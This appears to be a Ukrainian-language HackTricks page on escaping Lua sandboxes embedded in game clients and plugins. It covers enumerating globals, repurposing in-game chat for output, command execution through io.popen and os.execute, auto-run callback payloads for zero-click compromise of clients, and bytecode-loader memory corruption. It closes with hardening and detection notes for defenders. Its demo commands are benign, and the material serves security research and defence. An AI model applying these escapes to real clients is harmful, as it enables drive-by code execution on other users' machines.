# Обхід Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

На цій сторінці зібрані практичні техніки для переліку та виходу з Lua "sandboxes", вбудованих у застосунки (зокрема game clients, plugins або in-app scripting engines). Багато рушіїв відкривають обмежене Lua-середовище, але залишають доступними потужні глобальні змінні, що дозволяє виконувати довільні команди або навіть спричиняти корупцію нативної пам'яті, якщо відкриті bytecode loaders.

Ключові ідеї:
- Розглядайте VM як невідоме середовище: перелікуйте _G і виявляйте, які небезпечні примітиви доступні.
- Коли stdout/print заблоковані, використовуйте будь-який in-VM UI/IPC канал як вихідний приймач, щоб побачити результати.
- Якщо io/os доступні, часто є пряме виконання команд (io.popen, os.execute).
- Якщо load/loadstring/loadfile доступні, виконання спеціально створеного Lua bytecode може порушити безпеку пам'яті в деяких версіях (≤5.1 верифікатори можна обійти; у 5.2 верифікатор видалено), що дає змогу просунутій експлуатації.

## Перелікування середовища в пісковищі

- Злити глобальне середовище, щоб перелічити доступні таблиці/функції:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Якщо print() недоступна, перепрофілюйте in-VM channels. Приклад з MMO housing script VM, де вивід у чат працює лише після виклику звуку; наступний код будує надійну функцію виводу:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Узагальніть цей шаблон для вашої цілі: будь-яке textbox, toast, logger або UI callback, що приймає strings, може слугувати як stdout для розвідки.

## Пряме виконання команд, якщо io/os доступні

Якщо sandbox все ще надає доступ до стандартних бібліотек io або os, ймовірно, у вас є immediate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- Виконання відбувається всередині client process; багато anti-cheat/antidebug шарів, які блокують external debuggers, не завадять in-VM process creation.
- Також перевіряйте: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), і debug library (може підвищувати привілеї всередині VM).

## Zero-click тригери через auto-run callbacks

Якщо host application пушить скрипти клієнтам і VM надає auto-run hooks (наприклад, OnInit/OnLoad/OnEnter), розмістіть ваш payload там для drive-by compromise одразу після завантаження скрипта:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Any equivalent callback (OnLoad, OnEnter, etc.) generalizes this technique when scripts are transmitted and executed on the client automatically.

## Небезпечні примітиви, які варто шукати під час recon

Під час перебору _G особливо звертайте увагу на:
- io, os: io.popen, os.execute, file I/O, доступ до змінних оточення.
- load, loadstring, loadfile, dofile: виконують source або bytecode; підтримують завантаження ненадійного bytecode.
- package, package.loadlib, require: динамічне завантаження бібліотек і поверхня модулів.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo та хуки.
- LuaJIT-only: ffi.cdef, ffi.load для прямого виклику нативного коду.

Мінімальні приклади використання (якщо доступні):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Необов'язкова ескалація: зловживання Lua bytecode loaders

Коли load/loadstring/loadfile доступні, але io/os обмежені, виконання сконструйованого Lua bytecode може призвести до memory disclosure та corruption primitives. Ключові факти:
- Lua ≤ 5.1 постачався з bytecode verifier, який має відомі bypasses.
- Lua 5.2 повністю видалив verifier (офіційна позиція: applications should just reject precompiled chunks), що розширює attack surface, якщо bytecode loading не заборонено.
- Типовий робочий процес: leak pointers через in-VM output, craft bytecode для створення type confusions (наприклад навколо FORLOOP або інших opcodes), а потім перейти до arbitrary read/write або native code execution.

Цей шлях специфічний для engine/version і вимагає RE. Див. розділ Посилання для глибших розборів, exploitation primitives та прикладів gadgetry в іграх.

## Примітки щодо виявлення та hardening (для захисників)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## Посилання

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
